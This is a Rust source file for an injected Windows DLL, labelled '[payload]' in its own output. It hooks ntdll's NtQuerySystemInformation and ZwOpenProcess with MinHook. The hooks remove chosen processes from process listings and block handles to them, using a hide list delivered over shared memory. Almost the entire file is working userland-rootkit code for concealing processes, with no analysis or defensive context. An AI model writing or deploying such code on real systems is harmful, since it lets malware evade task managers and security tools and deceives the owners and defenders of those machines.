use std::cell::Cell;
use std::ffi::{c_void, CString};
use std::sync::RwLock;
use std::{iter, thread};

use minhook::MinHook;

use windows::core::PCWSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE, HINSTANCE};
use windows::Win32::System::Console::AllocConsole;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Threading::GetProcessId;

static CACHED_HIDE: RwLock<Vec<String>> = RwLock::new(Vec::new());
static CACHED_PID_MAP: RwLock<Vec<(u32, String)>> = RwLock::new(Vec::new());

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
#[allow(dead_code)]
struct SystemProcessInformation {
    next_entry_offset: u32,
    number_of_threads: u32,
    working_set_private_size: i64,
    hard_fault_count: u32,
    number_of_threads_high_watermark: u32,
    cycle_time: u64,
    create_time: i64,
    user_time: i64,
    kernel_time: i64,
    image_name: UnicodeString,
    base_priority: i32,
    unique_process_id: *mut c_void,
    inherited_from_unique_process_id: *mut c_void,
    handle_count: u32,
    session_id: u32,
    unique_process_key: usize,
    peak_virtual_size: usize,
    virtual_size: usize,
    page_fault_count: u32,
    peak_working_set_size: usize,
    working_set_size: usize,
    quota_peak_paged_pool_usage: usize,
    quota_paged_pool_usage: usize,
    quota_peak_non_paged_pool_usage: usize,
    quota_non_paged_pool_usage: usize,
    pagefile_usage: usize,
    peak_pagefile_usage: usize,
    private_page_count: usize,
    read_operation_count: i64,
    write_operation_count: i64,
    other_operation_count: i64,
    read_transfer_count: i64,
    write_transfer_count: i64,
    other_transfer_count: i64,
}

static mut ORIGINAL_ZW_OPEN_PROCESS: Option<FnZwOpenProcess> = None;
static mut ORIGINAL_NT_QUERY_SYSTEM_INFORMATION: Option<FnNtQuerySystemInformation> = None;

thread_local! {
    static BYPASS: Cell<bool> = const { Cell::new(false) };
}

type FnZwOpenProcess =
    unsafe extern "system" fn(*mut HANDLE, u32, *const c_void, *const c_void) -> u32;
type FnNtQuerySystemInformation =
    unsafe extern "system" fn(u32, *mut c_void, u32, *mut u32) -> u32;

fn get_cached_hide() -> Vec<String> {
    match CACHED_HIDE.read() {
        Ok(list) => list.clone(),
        Err(_) => Vec::new(),
    }
}

struct ProcessInfo {
    pid: u32,
    name: String,
}

fn trim_null_i8(bytes: &[i8]) -> String {
    let as_u8: &[u8] =
        unsafe { std::slice::from_raw_parts(bytes.as_ptr() as *const u8, bytes.len()) };
    let end = as_u8.iter().position(|&b| b == 0).unwrap_or(as_u8.len());
    String::from_utf8_lossy(&as_u8[..end]).to_string()
}

fn enumerate_processes() -> Vec<ProcessInfo> {
    BYPASS.with(|b| b.set(true));
    let result = enumerate_processes_inner();
    BYPASS.with(|b| b.set(false));
    result
}

fn enumerate_processes_inner() -> Vec<ProcessInfo> {
    let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };

    let mut entry = PROCESSENTRY32 {
        dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
        ..Default::default()
    };

    let mut list = Vec::new();

    if unsafe { Process32First(snapshot, &mut entry) }.is_ok() {
        loop {
            list.push(ProcessInfo {
                pid: entry.th32ProcessID,
                name: trim_null_i8(&entry.szExeFile),
            });
            if unsafe { Process32Next(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }

    let _ = unsafe { CloseHandle(snapshot) };
    list
}

fn is_hide_pid(pid: u32) -> bool {
    let hide = match CACHED_HIDE.read() {
        Ok(h) => h,
        Err(_) => return false,
    };
    if hide.is_empty() {
        return false;
    }

    let pid_map = match CACHED_PID_MAP.read() {
        Ok(m) => m,
        Err(_) => return false,
    };
    pid_map
        .iter()
        .any(|(p, name)| *p == pid && hide.iter().any(|h| h.eq_ignore_ascii_case(name)))
}

unsafe extern "system" fn zw_open_process_detour(
    handle_ptr: *mut HANDLE,
    desired_access: u32,
    object_attributes: *const c_void,
    client_id: *const c_void,
) -> u32 {
    let original = match ORIGINAL_ZW_OPEN_PROCESS {
        Some(f) => f,
        None => return 0xC000_0022,
    };
    let status = original(handle_ptr, desired_access, object_attributes, client_id);

    if status != 0 {
        return status;
    }

    let handle = *handle_ptr;
    let pid = GetProcessId(handle);

    if is_hide_pid(pid) {
        let _ = CloseHandle(handle);
        *handle_ptr = HANDLE::default();
        return 0xC000_0022;
    }

    status
}

unsafe extern "system" fn nt_query_system_information_detour(
    class: u32,
    info: *mut c_void,
    length: u32,
    return_length: *mut u32,
) -> u32 {
    let original = match ORIGINAL_NT_QUERY_SYSTEM_INFORMATION {
        Some(f) => f,
        None => return 0xC000_0001,
    };
    let status = original(class, info, length, return_length);

    if class != 5 || status != 0 {
        return status;
    }

    if BYPASS.with(|b| b.get()) {
        return status;
    }

    let hide = get_cached_hide();
    if hide.is_empty() {
        return status;
    }

    let mut prev: *mut SystemProcessInformation = std::ptr::null_mut();
    let mut curr = info as *mut SystemProcessInformation;

    loop {
        let should_hide =
            if !(*curr).image_name.buffer.is_null() && (*curr).image_name.length > 0 {
                let name_slice = std::slice::from_raw_parts(
                    (*curr).image_name.buffer,
                    ((*curr).image_name.length / 2) as usize,
                );
                let name = String::from_utf16_lossy(name_slice);
                hide.iter().any(|h| h.eq_ignore_ascii_case(&name))
            } else {
                false
            };

        if should_hide {
            if prev.is_null() {
                if (*curr).next_entry_offset == 0 {
                    break;
                }
                let next = (curr as usize + (*curr).next_entry_offset as usize)
                    as *mut SystemProcessInformation;
                std::ptr::copy(
                    next as *const u8,
                    curr as *mut u8,
                    length as usize - (next as usize - info as usize),
                );
                continue;
            } else if (*curr).next_entry_offset == 0 {
                (*prev).next_entry_offset = 0;
                break;
            } else {
                (*prev).next_entry_offset += (*curr).next_entry_offset;
                curr = (curr as usize + (*curr).next_entry_offset as usize)
                    as *mut SystemProcessInformation;
                continue;
            }
        }

        if (*curr).next_entry_offset == 0 {
            break;
        }
        prev = curr;
        curr =
            (curr as usize + (*curr).next_entry_offset as usize) as *mut SystemProcessInformation;
    }

    status
}

fn get_module_symbol_address(module: &str, symbol: &str) -> Option<usize> {
    let wide: Vec<u16> = module.encode_utf16().chain(iter::once(0)).collect();
    let c_symbol = CString::new(symbol).ok()?;

    unsafe {
        let handle = GetModuleHandleW(PCWSTR(wide.as_ptr())).ok()?;
        GetProcAddress(handle, windows::core::PCSTR(c_symbol.as_ptr() as _)).map(|f| f as usize)
    }
}

unsafe fn bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    let nt_query_addr = get_module_symbol_address("ntdll.dll", "NtQuerySystemInformation")
        .ok_or("Failed to resolve NtQuerySystemInformation")?;

    let zw_open_addr = get_module_symbol_address("ntdll.dll", "ZwOpenProcess")
        .ok_or("Failed to resolve ZwOpenProcess")?;

    let original_nq = MinHook::create_hook(
        nt_query_addr as *mut c_void,
        nt_query_system_information_detour as *mut c_void,
    )?;
    ORIGINAL_NT_QUERY_SYSTEM_INFORMATION =
        Some(std::mem::transmute::<*mut c_void, FnNtQuerySystemInformation>(original_nq));

    let original_zw = MinHook::create_hook(
        zw_open_addr as *mut c_void,
        zw_open_process_detour as *mut c_void,
    )?;
    ORIGINAL_ZW_OPEN_PROCESS =
        Some(std::mem::transmute::<*mut c_void, FnZwOpenProcess>(original_zw));

    MinHook::enable_all_hooks()?;

    Ok(())
}

fn spawn_shm_reader() {
    thread::spawn(|| {
        let mut reader = loop {
            if let Some(r) = shared::SharedMemoryReader::open() {
                break r;
            }
            thread::sleep(std::time::Duration::from_millis(100));
        };

        loop {
            if let Some(msg) = reader.read_if_changed() {
                if let Ok(mut cache) = CACHED_HIDE.write() {
                    *cache = msg.hide;
                }
            }
            thread::sleep(std::time::Duration::from_millis(50));
        }
    });
}

fn spawn_pid_map_refresher() {
    thread::spawn(|| loop {
        let procs = enumerate_processes();
        if let Ok(mut map) = CACHED_PID_MAP.write() {
            *map = procs.into_iter().map(|p| (p.pid, p.name)).collect();
        }
        thread::sleep(std::time::Duration::from_millis(100));
    });
}

pub fn initialize(_module: HINSTANCE) {
    unsafe { let _ = AllocConsole(); }
    println!("[payload] loaded");

    if let Err(e) = unsafe { bootstrap() } {
        eprintln!("[payload] hook install failed: {e}");
        return;
    }
    println!("[payload] hooks installed");

    spawn_shm_reader();
    spawn_pid_map_refresher();
}
